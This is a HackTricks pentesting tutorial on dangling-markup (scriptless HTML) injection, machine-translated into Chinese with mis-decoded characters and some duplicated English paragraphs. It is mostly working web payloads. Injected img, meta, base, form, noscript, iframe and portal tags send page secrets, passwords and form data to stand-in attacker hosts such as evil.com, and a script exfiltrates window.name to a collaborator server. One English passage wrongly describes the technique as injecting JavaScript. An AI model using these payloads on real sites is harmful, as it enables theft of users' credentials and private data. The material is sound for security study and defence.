# æ‚¬æŒ‚æ ‡è®° - HTMLæ— è„šæœ¬æ³¨å…¥

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## ç®€ä»‹

å½“å‘ç°**HTMLæ³¨å…¥**æ—¶ï¼Œå¯ä»¥ä½¿ç”¨æ­¤æŠ€æœ¯ä»ç”¨æˆ·é‚£é‡Œæå–ä¿¡æ¯ã€‚å¦‚æœæ‚¨**æ‰¾ä¸åˆ°ä»»ä½•æ–¹æ³•æ¥åˆ©ç”¨**[**XSS**](../xss-cross-site-scripting/)ï¼Œä½†å¯ä»¥**æ³¨å…¥ä¸€äº›HTMLæ ‡ç­¾**ï¼Œè¿™å°†éå¸¸æœ‰ç”¨ã€‚\
å¦‚æœæŸäº›**ç§˜å¯†ä»¥æ˜æ–‡ä¿å­˜**åœ¨HTMLä¸­ï¼Œå¹¶ä¸”æ‚¨æƒ³è¦ä»å®¢æˆ·ç«¯**çªƒå–**å®ƒï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è¦è¯¯å¯¼æŸäº›è„šæœ¬æ‰§è¡Œï¼Œè¿™ä¹Ÿå¾ˆæœ‰ç”¨ã€‚

è¿™é‡Œæåˆ°çš„å‡ ç§æŠ€æœ¯å¯ä»¥ç”¨äºé€šè¿‡æ„æƒ³ä¸åˆ°çš„æ–¹å¼ï¼ˆhtmlæ ‡ç­¾ã€CSSã€http-metaæ ‡ç­¾ã€è¡¨å•ã€baseç­‰ï¼‰ç»•è¿‡ä¸€äº›[**å†…å®¹å®‰å…¨ç­–ç•¥**](../content-security-policy-csp-bypass/)æ¥çªƒå–ä¿¡æ¯ã€‚

## ä¸»è¦åº”ç”¨

### çªƒå–æ˜æ–‡ç§˜å¯†

å¦‚æœæ‚¨æ³¨å…¥`<img src='http://evil.com/log.cgi?`ï¼Œå½“é¡µé¢åŠ è½½æ—¶ï¼Œå—å®³è€…å°†å‘æ‚¨å‘é€ä»æ³¨å…¥çš„`img`æ ‡ç­¾åˆ°ä»£ç ä¸­ä¸‹ä¸€ä¸ªå¼•å·ä¹‹é—´çš„æ‰€æœ‰ä»£ç ã€‚å¦‚æœæŸä¸ªç§˜å¯†æ°å¥½ä½äºè¯¥ä»£ç å—ä¸­ï¼Œæ‚¨å°†çªƒå–å®ƒï¼ˆæ‚¨ä¹Ÿå¯ä»¥ä½¿ç”¨åŒå¼•å·è¿›è¡Œç›¸åŒæ“ä½œï¼Œè¯·æŸ¥çœ‹å“ªä¸ªæ›´æœ‰è¶£ï¼‰ã€‚

å¦‚æœ`img`æ ‡ç­¾è¢«ç¦æ­¢ï¼ˆä¾‹å¦‚ç”±äºCSPï¼‰ï¼Œæ‚¨è¿˜å¯ä»¥ä½¿ç”¨`<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`ã€‚
```
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
è¯·æ³¨æ„ï¼Œ**Chromeä¼šé˜»æ­¢åŒ…å«"<"æˆ–"\n"çš„HTTP URL**ï¼Œå› æ­¤æ‚¨å¯ä»¥å°è¯•å…¶ä»–åè®®æ–¹æ¡ˆï¼Œå¦‚"ftp"ã€‚

æ‚¨è¿˜å¯ä»¥æ»¥ç”¨CSSçš„`@import`ï¼ˆå®ƒä¼šå‘é€ç›´åˆ°æ‰¾åˆ°";"ä¸ºæ­¢çš„æ‰€æœ‰ä»£ç ï¼‰ã€‚
```markup
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
æ‚¨è¿˜å¯ä»¥ä½¿ç”¨**`<table`**ï¼š
```bash
<table background='//your-collaborator-id.burpcollaborator.net?'
```
æ‚¨è¿˜å¯ä»¥æ’å…¥ä¸€ä¸ª`<base`æ ‡ç­¾ã€‚æ‰€æœ‰çš„ä¿¡æ¯éƒ½å°†è¢«å‘é€ï¼Œç›´åˆ°å¼•å·å…³é—­ï¼Œä½†è¿™éœ€è¦ä¸€äº›ç”¨æˆ·äº¤äº’ï¼ˆç”¨æˆ·å¿…é¡»ç‚¹å‡»æŸä¸ªé“¾æ¥ï¼Œå› ä¸ºbaseæ ‡ç­¾ä¼šæ”¹å˜é“¾æ¥æŒ‡å‘çš„åŸŸåï¼‰ï¼š
```markup
<base target='        <--- Injected
steal me'<b>test</b>
```
### ç›—å–è¡¨å•

In some cases, web applications may have forms that contain sensitive information such as usernames, passwords, or credit card details. As a hacker, you can exploit vulnerabilities in the application to steal this information.

åœ¨æŸäº›æƒ…å†µä¸‹ï¼ŒWebåº”ç”¨ç¨‹åºå¯èƒ½åŒ…å«åŒ…å«æ•æ„Ÿä¿¡æ¯çš„è¡¨å•ï¼Œä¾‹å¦‚ç”¨æˆ·åã€å¯†ç æˆ–ä¿¡ç”¨å¡è¯¦ç»†ä¿¡æ¯ã€‚ä½œä¸ºé»‘å®¢ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨åº”ç”¨ç¨‹åºä¸­çš„æ¼æ´æ¥çªƒå–è¿™äº›ä¿¡æ¯ã€‚

One technique to steal forms is by injecting malicious code into the application's HTML markup. This technique is known as "dangling markup" or "HTML scriptless injection". It involves injecting code that is not executed by the browser but is still present in the HTML source code.

ä¸€ç§çªƒå–è¡¨å•çš„æŠ€æœ¯æ˜¯å°†æ¶æ„ä»£ç æ³¨å…¥åˆ°åº”ç”¨ç¨‹åºçš„HTMLæ ‡è®°ä¸­ã€‚è¿™ç§æŠ€æœ¯è¢«ç§°ä¸ºâ€œæ‚¬æŒ‚æ ‡è®°â€æˆ–â€œHTMLæ— è„šæœ¬æ³¨å…¥â€ã€‚å®ƒæ¶‰åŠæ³¨å…¥åœ¨HTMLæºä»£ç ä¸­æœªè¢«æµè§ˆå™¨æ‰§è¡Œä½†ä»ç„¶å­˜åœ¨çš„ä»£ç ã€‚

To steal a form using dangling markup, you need to identify a vulnerable input field in the application. This can be a text input, password input, or any other form field that accepts user input.

è¦ä½¿ç”¨æ‚¬æŒ‚æ ‡è®°çªƒå–è¡¨å•ï¼Œæ‚¨éœ€è¦è¯†åˆ«åº”ç”¨ç¨‹åºä¸­çš„ä¸€ä¸ªæ˜“å—æ”»å‡»çš„è¾“å…¥å­—æ®µã€‚è¿™å¯ä»¥æ˜¯æ–‡æœ¬è¾“å…¥ã€å¯†ç è¾“å…¥æˆ–ä»»ä½•å…¶ä»–æ¥å—ç”¨æˆ·è¾“å…¥çš„è¡¨å•å­—æ®µã€‚

Once you have identified the vulnerable input field, you can inject malicious code into the value attribute of the field. This code can be JavaScript code that captures the form data and sends it to an external server controlled by the hacker.

ä¸€æ—¦æ‚¨ç¡®å®šäº†æ˜“å—æ”»å‡»çš„è¾“å…¥å­—æ®µï¼Œæ‚¨å¯ä»¥å°†æ¶æ„ä»£ç æ³¨å…¥åˆ°å­—æ®µçš„valueå±æ€§ä¸­ã€‚è¿™æ®µä»£ç å¯ä»¥æ˜¯JavaScriptä»£ç ï¼Œç”¨äºæ•è·è¡¨å•æ•°æ®å¹¶å°†å…¶å‘é€åˆ°é»‘å®¢æ§åˆ¶çš„å¤–éƒ¨æœåŠ¡å™¨ã€‚

When a user submits the form, the injected code will execute and send the form data to the hacker's server without the user's knowledge. This allows the hacker to steal sensitive information from the form.

å½“ç”¨æˆ·æäº¤è¡¨å•æ—¶ï¼Œæ³¨å…¥çš„ä»£ç å°†åœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ‰§è¡Œå¹¶å°†è¡¨å•æ•°æ®å‘é€åˆ°é»‘å®¢çš„æœåŠ¡å™¨ã€‚è¿™ä½¿å¾—é»‘å®¢å¯ä»¥ä»è¡¨å•ä¸­çªƒå–æ•æ„Ÿä¿¡æ¯ã€‚

To protect against this type of attack, web developers should sanitize and validate user input, and implement measures such as input filtering and output encoding to prevent code injection.

ä¸ºäº†é˜²æ­¢è¿™ç§ç±»å‹çš„æ”»å‡»ï¼ŒWebå¼€å‘äººå‘˜åº”å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œæ¸…ç†å’ŒéªŒè¯ï¼Œå¹¶é‡‡å–è¯¸å¦‚è¾“å…¥è¿‡æ»¤å’Œè¾“å‡ºç¼–ç ç­‰æªæ–½æ¥é˜²æ­¢ä»£ç æ³¨å…¥ã€‚
```markup
<base href='http://evil.com/'>
```
ç„¶åï¼Œå°†æ•°æ®å‘é€åˆ°è·¯å¾„çš„è¡¨å•ï¼ˆå¦‚`<form action='update_profile.php'>`ï¼‰å°†æŠŠæ•°æ®å‘é€åˆ°æ¶æ„åŸŸã€‚

### å·å–è¡¨å• 2

è®¾ç½®ä¸€ä¸ªè¡¨å•å¤´ï¼š`<form action='http://evil.com/log_steal'>`ï¼Œè¿™å°†è¦†ç›–ä¸‹ä¸€ä¸ªè¡¨å•å¤´ï¼Œå¹¶ä¸”è¡¨å•ä¸­çš„æ‰€æœ‰æ•°æ®å°†è¢«å‘é€ç»™æ”»å‡»è€…ã€‚

### å·å–è¡¨å• 3

æŒ‰é’®å¯ä»¥ä½¿ç”¨å±æ€§"formaction"æ›´æ”¹è¡¨å•ä¿¡æ¯å°†è¦å‘é€åˆ°çš„URLï¼š
```markup
<button name=xss type=submit formaction='https://google.com'>I get consumed!
```
æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæŠ€æœ¯æ¥çªƒå–ä¿¡æ¯ã€‚

### çªƒå–æ˜æ–‡å¯†ç  2

ä½¿ç”¨å‰é¢æåˆ°çš„æœ€æ–°æŠ€æœ¯æ¥çªƒå–è¡¨å•ï¼ˆæ³¨å…¥æ–°çš„è¡¨å•å¤´ï¼‰ï¼Œç„¶åå¯ä»¥æ³¨å…¥ä¸€ä¸ªæ–°çš„è¾“å…¥å­—æ®µï¼š
```markup
<input type='hidden' name='review_body' value="
```
è€Œè¿™ä¸ªè¾“å…¥å­—æ®µå°†åŒ…å«HTMLä¸­åŒå¼•å·ä¹‹é—´ä»¥åŠä¸‹ä¸€ä¸ªåŒå¼•å·ä¹‹é—´çš„æ‰€æœ‰å†…å®¹ã€‚è¿™ç§æ”»å‡»å°†"_**çªƒå–æ˜æ–‡å¯†ç **_"ä¸"_**çªƒå–è¡¨å•2**_"ç›¸ç»“åˆã€‚

æ‚¨å¯ä»¥é€šè¿‡æ³¨å…¥ä¸€ä¸ªè¡¨å•å’Œä¸€ä¸ª`<option>`æ ‡ç­¾æ¥æ‰§è¡Œç›¸åŒçš„æ“ä½œã€‚ç›´åˆ°æ‰¾åˆ°é—­åˆçš„`</option>`æ ‡ç­¾ä¹‹å‰çš„æ‰€æœ‰æ•°æ®éƒ½å°†è¢«å‘é€ï¼š
```markup
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### è¡¨å•å‚æ•°æ³¨å…¥

æ‚¨å¯ä»¥æ›´æ”¹è¡¨å•çš„è·¯å¾„å¹¶æ’å…¥æ–°çš„å€¼ï¼Œä»¥æ‰§è¡Œæ„å¤–çš„æ“ä½œï¼š
```markup
<form action='/change_settings.php'>
<input type='hidden' name='invite_user'
value='fredmbogo'>                                        â† Injected lines

<form action="/change_settings.php">                        â† Existing form (ignored by the parser)
...
<input type="text" name="invite_user" value="">             â† Subverted field
...
<input type="hidden" name="xsrf_token" value="12345">
...
</form>
```
### é€šè¿‡noscriptçªƒå–æ˜æ–‡å¯†ç 

`<noscript></noscript>`æ˜¯ä¸€ä¸ªæ ‡ç­¾ï¼Œå¦‚æœæµè§ˆå™¨ä¸æ”¯æŒJavaScriptï¼ˆæ‚¨å¯ä»¥åœ¨[chrome://settings/content/javascript](chrome://settings/content/javascript)ä¸­å¯ç”¨/ç¦ç”¨Chromeä¸­çš„JavaScriptï¼‰ï¼Œåˆ™å…¶å†…å®¹å°†è¢«è§£é‡Šã€‚

ä¸€ç§ä»æ³¨å…¥ç‚¹åˆ°åº•éƒ¨å°†ç½‘é¡µå†…å®¹æ³„éœ²åˆ°æ”»å‡»è€…æ§åˆ¶çš„ç«™ç‚¹çš„æ–¹æ³•æ˜¯æ³¨å…¥ä»¥ä¸‹å†…å®¹ï¼š
```markup
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### é€šè¿‡ç”¨æˆ·äº¤äº’ç»•è¿‡CSP

ä»è¿™ä¸ª[PortSwiggerçš„ç ”ç©¶](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)ä¸­ï¼Œä½ å¯ä»¥äº†è§£åˆ°å³ä½¿åœ¨**æœ€ä¸¥æ ¼çš„CSPé™åˆ¶**ç¯å¢ƒä¸‹ï¼Œä»ç„¶å¯ä»¥é€šè¿‡ä¸€äº›**ç”¨æˆ·äº¤äº’**æ¥**æ³„éœ²æ•°æ®**ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ä»¥ä¸‹æœ‰æ•ˆè½½è·ï¼š
```markup
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
è¯·æ³¨æ„ï¼Œæ‚¨å°†è¦æ±‚**å—å®³è€…**ç‚¹å‡»ä¸€ä¸ªé“¾æ¥ï¼Œè¯¥é“¾æ¥å°†å°†å…¶é‡å®šå‘åˆ°æ‚¨æ§åˆ¶çš„**è½½è·**ã€‚è¿˜è¯·æ³¨æ„ï¼Œ**`base`** æ ‡ç­¾ä¸­çš„ **`target`** å±æ€§å°†åŒ…å« **HTML å†…å®¹**ï¼Œç›´åˆ°ä¸‹ä¸€ä¸ªå•å¼•å·ã€‚\
è¿™å°†å¯¼è‡´å¦‚æœé“¾æ¥è¢«ç‚¹å‡»ï¼Œ**`window.name`** çš„å€¼å°†æ˜¯æ‰€æœ‰çš„ **HTML å†…å®¹**ã€‚å› æ­¤ï¼Œç”±äºæ‚¨æ§åˆ¶ç€å—å®³è€…ç‚¹å‡»é“¾æ¥åè®¿é—®çš„é¡µé¢ï¼Œæ‚¨å¯ä»¥è®¿é—®è¯¥ **`window.name`** å¹¶å°†æ•°æ®**æ³„éœ²**å‡ºå»ï¼š
```markup
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### è¯¯å¯¼æ€§è„šæœ¬å·¥ä½œæµ1 - HTMLå‘½åç©ºé—´æ”»å‡»

åœ¨HTMLä¸­æ’å…¥ä¸€ä¸ªæ–°çš„å¸¦æœ‰idçš„æ ‡ç­¾ï¼Œå®ƒå°†è¦†ç›–ä¸‹ä¸€ä¸ªæ ‡ç­¾ï¼Œå¹¶ä¸”å…·æœ‰ä¸€ä¸ªä¼šå½±å“è„šæœ¬æµç¨‹çš„å€¼ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæ‚¨å¯ä»¥é€‰æ‹©ä¸è°å…±äº«ä¿¡æ¯ï¼š
```markup
<input type='hidden' id='share_with' value='fredmbogo'>     â† Injected markup
...
Share this status update with:                              â† Legitimate optional element of a dialog
<input id='share_with' value=''>

...

function submit_status_update() {
...
request.share_with = document.getElementById('share_with').value;
...
}
```
### è¯¯å¯¼æ€§è„šæœ¬å·¥ä½œæµ2 - è„šæœ¬å‘½åç©ºé—´æ”»å‡»

é€šè¿‡æ’å…¥HTMLæ ‡ç­¾åœ¨JavaScriptå‘½åç©ºé—´ä¸­åˆ›å»ºå˜é‡ã€‚ç„¶åï¼Œè¿™ä¸ªå˜é‡å°†å½±å“åº”ç”¨ç¨‹åºçš„æµç¨‹ï¼š
```markup
<img id='is_public'>                                        â† Injected markup

...

// Legitimate application code follows

function retrieve_acls() {
...
if (response.access_mode == AM_PUBLIC)                    â† The subsequent assignment fails in IE
is_public = true;
else
is_public = false;
}

function submit_new_acls() {
...
if (is_public) request.access_mode = AM_PUBLIC;           â† Condition always evaluates to true
...
}
```
### JSONPçš„æ»¥ç”¨

å¦‚æœä½ å‘ç°ä¸€ä¸ªJSONPæ¥å£ï¼Œä½ å¯ä»¥è°ƒç”¨ä»»æ„å‡½æ•°å¹¶ä¼ é€’ä»»æ„æ•°æ®ï¼š
```markup
<script src='/editor/sharing.js'>:              â† Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    â† Injected JSONP call
set_sharing({ ... })
```
æˆ–è€…ä½ ç”šè‡³å¯ä»¥å°è¯•æ‰§è¡Œä¸€äº› JavaScriptï¼š
```markup
<script src='/search?q=a&call=alert(1)'></script>
```
### Iframeæ»¥ç”¨

è¯·æ³¨æ„ï¼Œå³ä½¿è·¨æºï¼Œ**å­æ–‡æ¡£å¯ä»¥æŸ¥çœ‹å’Œè®¾ç½®çˆ¶æ–‡æ¡£çš„ä½ç½®å±æ€§**ã€‚è¿™æ„å‘³ç€æ‚¨å¯ä»¥é€šè¿‡åœ¨**iframe**ä¸­åŠ è½½ä¸€äº›ä»£ç æ¥ä½¿å®¢æˆ·ç«¯è®¿é—®ä»»ä½•å…¶ä»–é¡µé¢ï¼Œä¾‹å¦‚ï¼š
```markup
<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>
```
è¿™å¯ä»¥é€šè¿‡ç±»ä¼¼ä»¥ä¸‹æ–¹å¼æ¥å‡è½»é£é™©ï¼š_**sandbox='allow-scripts allow-top-navigation'**_

è¿˜å¯ä»¥åˆ©ç”¨ iframe æ¥ä»ä¸åŒé¡µé¢ä¸­æ³„éœ²æ•æ„Ÿä¿¡æ¯ï¼Œ**ä½¿ç”¨ iframe çš„ name å±æ€§**ã€‚è¿™æ˜¯å› ä¸ºä½ å¯ä»¥åˆ›å»ºä¸€ä¸ª iframeï¼Œé€šè¿‡æ»¥ç”¨ HTML æ³¨å…¥ï¼Œä½¿å¾—**æ•æ„Ÿä¿¡æ¯å‡ºç°åœ¨ iframe çš„ name å±æ€§ä¸­**ï¼Œç„¶åä»åˆå§‹ iframe è®¿é—®è¯¥ name å±æ€§å¹¶æ³„éœ²ä¿¡æ¯ã€‚
```html
<script>
function cspBypass(win) {
win[0].location = 'about:blank';
setTimeout(()=>alert(win[0].name), 500);
}
</script>

<iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27" onload="cspBypass(this.contentWindow)"></iframe>
```
æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹[https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### \<meta æ»¥ç”¨

æ‚¨å¯ä»¥ä½¿ç”¨**`meta http-equiv`**æ‰§è¡Œ**å¤šä¸ªæ“ä½œ**ï¼Œä¾‹å¦‚è®¾ç½®Cookieï¼š`<meta http-equiv="Set-Cookie" Content="SESSID=1">` æˆ–æ‰§è¡Œé‡å®šå‘ï¼ˆåœ¨æ­¤æƒ…å†µä¸‹ä¸º5ç§’ï¼‰ï¼š`<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

è¿™å¯ä»¥é€šè¿‡ä½¿ç”¨ä¸**http-equiv**ç›¸å…³çš„**CSP**æ¥**é¿å…**ï¼ˆ`Content-Security-Policy: default-src 'self';` æˆ– `Content-Security-Policy: http-equiv 'self';`ï¼‰

### æ–°çš„ \<portal HTML æ ‡ç­¾

æ‚¨å¯ä»¥åœ¨[æ­¤å¤„](https://research.securitum.com/security-analysis-of-portal-element/)æ‰¾åˆ°å…³äº\<portal æ ‡ç­¾å¯åˆ©ç”¨æ¼æ´çš„éå¸¸**æœ‰è¶£çš„ç ”ç©¶**ã€‚\
åœ¨æ’°å†™æœ¬æ–‡æ—¶ï¼Œæ‚¨éœ€è¦åœ¨Chromeä¸­å¯ç”¨portalæ ‡ç­¾ï¼Œæ–¹æ³•æ˜¯åœ¨`chrome://flags/#enable-portals`ä¸­è¿›è¡Œè®¾ç½®ï¼Œå¦åˆ™å®ƒå°†æ— æ³•å·¥ä½œã€‚
```markup
<portal src='https://attacker-server?
```
### HTMLæ³„æ¼

å¹¶éæ‰€æœ‰HTMLä¸­æ³„æ¼è¿æ¥çš„æ–¹æ³•éƒ½å¯¹æ‚¬æŒ‚æ ‡è®°æœ‰ç”¨ï¼Œä½†æœ‰æ—¶å®ƒå¯èƒ½ä¼šæœ‰æ‰€å¸®åŠ©ã€‚åœ¨è¿™é‡ŒæŸ¥çœ‹å®ƒä»¬ï¼š[https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## SSæ³„æ¼

è¿™æ˜¯**æ‚¬æŒ‚æ ‡è®°å’ŒXS-Leaksçš„æ··åˆ**ã€‚ä¸€æ–¹é¢ï¼Œè¿™ç§æ¼æ´å…è®¸åœ¨æˆ‘ä»¬å°†æ”»å‡»çš„**åŒæºé¡µé¢**ä¸­**æ³¨å…¥HTML**ï¼ˆä½†ä¸èƒ½æ³¨å…¥JSï¼‰ã€‚å¦ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬ä¸ä¼šç›´æ¥æ”»å‡»å¯ä»¥æ³¨å…¥HTMLçš„é¡µé¢ï¼Œè€Œæ˜¯æ”»å‡»**å¦ä¸€ä¸ªé¡µé¢**ã€‚

{% content-ref url="ss-leaks.md" %}
[ss-leaks.md](ss-leaks.md)
{% endcontent-ref %}

## XS-Search/XS-Leaks

XS-Searchæ˜¯ä¸ºäº†æ»¥ç”¨**ä¾§ä¿¡é“æ”»å‡»**è€Œå®šä½äº**çªƒå–è·¨æºä¿¡æ¯**çš„æŠ€æœ¯ã€‚å› æ­¤ï¼Œå®ƒæ˜¯ä¸€ç§ä¸æ‚¬æŒ‚æ ‡è®°ä¸åŒçš„æŠ€æœ¯ï¼Œç„¶è€Œï¼Œå…¶ä¸­ä¸€äº›æŠ€æœ¯æ»¥ç”¨äº†HTMLæ ‡ç­¾çš„åŒ…å«ï¼ˆåŒ…æ‹¬æœ‰å’Œæ²¡æœ‰JSæ‰§è¡Œçš„æƒ…å†µï¼‰ï¼Œæ¯”å¦‚[**CSSæ³¨å…¥**](../xs-search.md#css-injection)æˆ–[**å»¶è¿ŸåŠ è½½å›¾ç‰‡**](../xs-search.md#image-lazy-loading)**ã€‚**

{% content-ref url="../xs-search.md" %}
[xs-search.md](../xs-search.md)
{% endcontent-ref %}

## æš´åŠ›ç ´è§£æ£€æµ‹åˆ—è¡¨

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## å‚è€ƒèµ„æ–™

è¿™é‡Œå¯ä»¥æŸ¥çœ‹æ‰€æœ‰ä»‹ç»çš„æŠ€æœ¯ä»¥åŠæ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼š

{% embed url="http://lcamtuf.coredump.cx/postxss/" %}

è¿˜å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°å¯ä»¥æ»¥ç”¨çš„å…¶ä»–HTMLæ ‡ç­¾ï¼š

{% embed url="http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/" %}

æ›´å¤šä¿¡æ¯ï¼š

{% embed url="https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**ä¸ºä½ çš„å…¬å¸åšå¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTæ”¶è—å“](https://opensea.io/collection/the-peass-family)â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
